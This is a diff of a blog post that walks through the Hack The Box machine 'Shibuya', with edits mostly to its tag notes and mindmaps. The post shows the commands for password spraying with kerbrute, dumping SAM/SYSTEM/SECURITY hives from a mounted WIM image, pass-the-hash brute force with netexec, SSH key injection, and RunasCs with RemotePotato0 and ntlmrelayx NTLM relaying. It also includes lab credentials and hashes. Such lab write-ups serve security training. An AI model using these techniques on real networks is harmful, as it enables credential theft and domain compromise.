@@ -7,22 +7,13 @@ tags:
   - blog
   - netexec
   - smb-username-collect
-  - kerberbrute
-  - smb-description
-  - netexec-kerberos-auth
-  - wim
   - netexec-spider
-  - SAM-SYSTEM-SECUITY
-  - SAM-SYSTEM-SECUITY-hashcrack
-  - netexec-users-hashs
-  - smb-login-with-hash
-  - smb-to-ssh
-  - windows-Firewall-Enumeration
   - HTB
   - windows
   - hard
   - bloodhound-HasSession
-lastmod: 2026-03-29T04:28:27.418Z
+  - ssh-key-inject
+lastmod: 2026-04-03T17:15:52.065Z
 ---
 # Box  Info
 
@@ -103,11 +94,9 @@ Nmap done: 1 IP address (1 host up) scanned in 97.94 seconds
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "netexec" >}}  The netexec will auto generate subdomain and domain the file for you to add into the /etc/hosts
+{{< tag "netexec" >}}  Using netexec 's generate-hosts-file which will automatically generate subdomain and domain the file for you to add into the /etc/hosts
 
 {{< /toggle >}}
-
-only the `netexec smb 10.129.32.246  --generate-hosts-file hosts` is dont work , you have to add into the `/etc/host` and successfully ping it ;otherwise, you cant login it , Also you need to use the `-k` in netexec to login
 
 ```shell
 └─# ping shibuya.vl
@@ -123,14 +112,27 @@ rtt min/avg/max/mdev = 43.763/44.372/45.152/0.516 ms
                                                                                                                                                   
 ```
 
-### SMB 445 --Scan
+### SMB 445
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "smb-username-collect" >}}  when the windows smb share the home directory it will possible show the users 's name .
+{{< tag "smb-username-collect" >}}  Finding SMB accepts anonymous users login and homes directory which show the username also add the xato-net-10-million-usernames.txt wordlist,using kerbrute to verify the user of purple and red which repeatedly use the same password and account, then need to the -k to successfully login to view the password in the Description.
 
-{{< /toggle >}}\
-Don’t get too much information form here ;However ,got the `homes` directory which show the username
+{{< /toggle >}}
+
+{{< mindmap >}}
+
+# SMB
+
+* anonymous
+  * home username
+
+# wordlist + found user
+
+* same username and password
+  * password in Description
+
+{{< /mindmap >}}
 
 ```
 └─# nxc smb 10.129.234.42/24 -u 'guest' -p '' --shares
@@ -163,14 +165,6 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 # Shell as red
 
 ### kerbrute
-
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "kerberbrute" >}} Having the usernames list from smb share , also add the xato-net-10-million-usernames.txt list , so kerbrute verify the user of purple and red
-
-{{< /toggle >}}
-
-download the xato-net-10-million-usernames.txt
 
 ```
 wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/xato-net-10-million-usernames.txt
@@ -207,23 +201,11 @@ purple
 red
 ```
 
-I will the the Same account name and same password ,also try the Cipher Transformation if need ,but I successfully find the account of red  : red by
+I will the the Same account name and same password ,also try the Cipher Transformation if need ,but I successfully find the account of red  : red
 
 ```shell
 ./kerbrute_dev passwordspray -d shibuya.vl --dc 10.129.32.246 valid_users.txt passwords.txt
 ```
-
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "netexec-kerberos-auth" >}} smb need the kerberos auth with -k
-
-{{< /toggle >}}
-
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "smb-description" >}} The smb Description show something like the password
-
-{{< /toggle >}}
 
 Successfully login ,but need to use the -k of kerberos auth ,and the Description show the something like the password of K5\&A6Dw9d8jrKWhV
 
@@ -265,11 +247,23 @@ SMB         shibuya.vl      445    AWSJPDC0522      users           READ
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "netexec-spider" >}}   The shares of `images$` dont have it before, so i will use the ` --spider 'folder' --regex .` and found the `wim` which is something like the `iso` stuff , after google , i am able to use the `wimtools`  to mount it
+{{< tag "netexec-spider" >}}   Using netexec 's --spider to reach wim file which is Windows Imaging in SMB, mounting the wim file to find SAM,SYSTEM,SECUITY which can decoded by secretsdump.py to have users 's hash by crackstation, using the decode hashes with valid username to cross hashes and username brute-force to the valid account which can use smbclient with  --pw-nt-hash to do the hashes login .
 
 {{< /toggle >}}
 
-The shares of `images$` dont have it before, so i will use the ` --spider 'folder' --regex .` and found the `wim` which is something like the `iso` stuff , after google , i am able to use the `wimtools`  to mount it
+{{< mindmap >}}
+
+# SMB
+
+* wim
+  * SAM,SYSTEM,SECUITY
+
+# secretsdump.py
+
+* cross hashes and username brute-force
+  * smbclient login
+
+{{< /mindmap >}}
 
 ```
 └─# netexec smb shibuya.vl   -u 'svc_autojoin'  -p 'K5&A6Dw9d8jrKWhV' -k --spider 'images$' --regex .
@@ -285,13 +279,7 @@ SMB         shibuya.vl      445    AWSJPDC0522      //shibuya.vl/images$/vss-met
 
 ```
 
-### wimtools
-
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "wim" >}}  the (Windows Imaging) wim file something like the iso file that was introduced in Windows Vista. It is primarily used to capture, to modify, and to apply file-based disk images for rapid deployment . There it can read by wimtools tools
-
-{{< /toggle >}}
+In kali local Linux
 
 ```
 sudo apt update
@@ -317,12 +305,6 @@ sudo wimmount AWSJPWK0222-03.wim 1 /mnt/htb2
 └─# ls
 hgfs  htb  htb1  htb2
 ```
-
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "SAM-SYSTEM-SECUITY" >}}  SAM : stores locally cached credentials (referred to as SAM secrets) , SECURITY : stores domain cached credentials (referred to as LSA secrets) , SYSTEM : contains enough info to decrypt SAM secrets and LSA secrets . Therefore use the secretsdump.py to get the hash
-
-{{< /toggle >}}
 
 Found the `SAM` , `SYSTEM` , `SECUITY` ,so need to copy the editable place .
 
@@ -372,13 +354,8 @@ NL$KM:92b989ef842fd6557367318fe0020266f98142688c3bdf5d0ae5baf24a2c430e1cc54f401e
                                                                                                                                                
 ```
 
-{{< toggle "Tag 🏷️" >}}
+The crackstation show that only have one hash is successful (2 is the same)
 
-{{< tag "SAM-SYSTEM-SECUITY-hashcrack" >}}  Using the online platform of crackstation to get the hash
-
-{{< /toggle >}}
-
-The crackstation show that only have one hash is successful (2 is the same)\
 ![Pasted image 20260121155534.png](/ob/Pasted%20image%2020260121155534.png)
 
 # Shell as Simon.Watson
@@ -407,13 +384,7 @@ Simon.Watson
 
 ```
 
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "netexec-users-hashs" >}}  Burte-force with the username and the hashes by netexec
-
-{{< /toggle >}}
-
-Burte-force with the username and the hashes
+brute-force with the username and the hashes
 
 ```
 └─# netexec smb shibuya.vl   -u ./user_list  -H ./hashes.txt                         
@@ -460,12 +431,6 @@ SMB         10.129.32.246   445    AWSJPDC0522      [+] shibuya.vl\Simon.Watson:
 1fe837c138d1089c9a0763239cd3cb42
 
 ```
-
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "smb-login-with-hash" >}}  although the netexec can show the info with hashes , but only the smbclient can interact the file with hashes
-
-{{< /toggle >}}
 
 `Simon.Watson` and `5d8c3d1a20bd63f60f469f6763ca0d50` success
 
@@ -571,7 +536,7 @@ smb: \simon.watson\Desktop\>
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "smb-to-ssh" >}}  The user of Simon.Watson folder is writeable that also mean i can ssh login due to i can put the ssh public key in the `.ssh` folder with the authorized\_keys
+{{< tag "ssh-key-inject" >}}  Discovering user 's folder is writeable that also mean i can ssh login due to i can put the ssh public key in the .ssh folder with the authorized keys
 
 {{< /toggle >}}
 
@@ -659,21 +624,26 @@ shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "bloodhound-" >}}  Owner the account due to machine has the  HasSession on bloodhound
+{{< tag "bloodhound-HasSession" >}}  Finding the attack path of  HasSession in bloodhound,then abusing the RunasCs to run specific processes with different permissions than the user's current logon provides using explicit credentials,enuming windows firewall OpenPort to abuse the DCOM activation service and trigger an NTLM authentication by RemotePotato0.exe to connect Linux NTLM server by ntlmrelayx.py
+
+{{< /toggle >}}
 
 {{< mindmap >}}
 
-# Foothold
-
-## bloodhound
+# bloodhound
 
 * HasSession
-  * runasCS
-    * .\RemotePotato0.exe
+
+# RunasCs
+
+* nigel.mills (ID : 1 )
+
+# enum wind firewall
+
+* ntlmrelayx.py
+* .\RemotePotato0.exe
 
 {{< /mindmap >}}
-
-{{< /toggle >}}
 
 bloodhound show that we can upgrade the `nigel.mills` ,as the bloodhound show that the `shibuya\simon.watson@AWSJPDC0522` has the `HasSession` to nigel.mills
 
@@ -716,9 +686,6 @@ shibuya\simon.watson@AWSJPDC0522 C:\ProgramData>.\RunasCs.exe SIMON.WATSON SIMON
 ```
 
 ![Pasted image 20260122001152.png](/ob/Pasted%20image%2020260122001152.png)
-
-https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ne-ntsecapi-security\_logon\_type\
-![Pasted image 20260122001420.png](/ob/Pasted%20image%2020260122001420.png)
 
 `ntlmrelayx.py` module performs the SMB Relay attacks originally discovered by cDc extended to many target protocols (SMB, MSSQL, LDAP, etc). It receives a list of targets and for every connection received it will choose the next target and try to relay the credentials. Also, if specified, it will first try to authenticate against the client connecting to us.
 
@@ -774,11 +741,7 @@ OSError: [Errno 98] Address already in use
 [*] (HTTP): Connection from 10.129.234.42 controlled, attacking target ldap://10.129.0.1
 ```
 
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "windows-Firewall-Enumeration" >}}  need to know the filewall which port is allow the traffic
-
-{{< /toggle >}}
+need to know the filewall which port is allow the traffic
 
 ```
 powershell -Command "netsh advfirewall firewall show rule name=all | ForEach-Object { if ($_ -match '^Rule Name:') { $c = @($_) } elseif ($_ -eq '') { $b = $c -join [char]10; if ($b -match 'Enabled:\s+Yes' -and $b -match 'Direction:\s+In' -and $b -match 'Profiles:\s+.*Domain' -and $b -match 'Protocol:\s+TCP') { $b; [char]10 }; $c = @() } else { $c += $_ } }"
